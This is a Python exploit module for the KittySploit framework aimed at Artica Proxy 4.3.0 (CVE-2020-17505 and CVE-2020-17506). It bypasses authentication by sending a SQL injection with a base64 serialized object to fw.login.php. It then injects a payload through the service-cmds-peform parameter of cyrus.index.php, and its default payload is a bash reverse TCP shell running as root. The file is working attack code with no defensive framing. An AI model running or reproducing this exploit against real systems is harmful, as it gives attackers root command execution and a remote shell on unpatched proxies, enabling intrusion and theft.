#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Exploit, Http_client):

	__info__ = {
		"name": "Artica Proxy 4.3.0 - Auth Bypass/OS Command Injection",
		"description": "Artica Web Proxy 4.30.000000 allows an authenticated remote attacker "\
      					"to inject commands via the service-cmds parameter in cyrus.php. "\
               			"These commands are executed with root privileges via service_cmds_peform",
		"author": "KittySploit Team",
		"cve": ["2020-17505","2020-17506"],
		"arch": [Arch.X86, Arch.X64],
		"platform": Platform.LINUX,
		"category": "singles",
		"payload": {
			"default": "payloads/singles/cmd/unix/bash_reverse_tcp",
			"arch": "cmd",
			"platform": ["unix","linux"],
			"category": "singles",
			}
	}	

	def bypass_auth(self):
		login_endpoint = "/fw.login.php?apikey="
		serialize_object = self.encode_base64('a:2:{s:3:"uid";s:4:"-100";s:22:"ACTIVE_DIRECTORY_INDEX";s:1:"1";}')
		injection = f"%27UNION%20select%201,%27{serialize_object}%27;"

		print_success("Bypassing authentication...")
		r = self.http_request(
					method = "GET",
					path = login_endpoint + injection,
					verify = False,
					session = True
					)
		
	def run(self):
		self.bypass_auth()
		print_status("Send shellcode")
		r = self.http_request(
					method = "GET",
					path = f"/cyrus.index.php?service-cmds-peform=||{self.payload}||",
					verify = False,
					session = True
					)
		if r.status_code == 200:
			self.vulnerable()
			return True
		else:
			self.not_vulnerable()
			return False
		return False
